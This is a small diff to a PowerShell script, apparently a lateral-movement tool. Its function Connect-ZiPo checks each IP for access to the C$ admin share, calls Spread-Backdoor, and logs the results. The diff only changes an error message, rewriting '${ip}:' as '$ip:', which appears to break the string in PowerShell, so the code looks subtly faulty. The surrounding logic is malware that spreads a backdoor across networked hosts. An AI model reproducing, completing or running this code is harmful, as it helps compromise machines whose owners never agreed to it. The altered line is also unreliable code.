@@ -187,7 +187,7 @@ function Connect-ZiPo {
                 $result = Spread-Backdoor -targetIP $ip
                 $sw.WriteLine($result)
             } catch {
-                $sw.WriteLine("[ERROR] Failed to spread to ${ip}: $($_.Exception.Message)")
+                $sw.WriteLine("[ERROR] Failed to spread to $ip: $($_.Exception.Message)")
             }
         } else {
             $sw.WriteLine("[ ] No access to $ip C$")
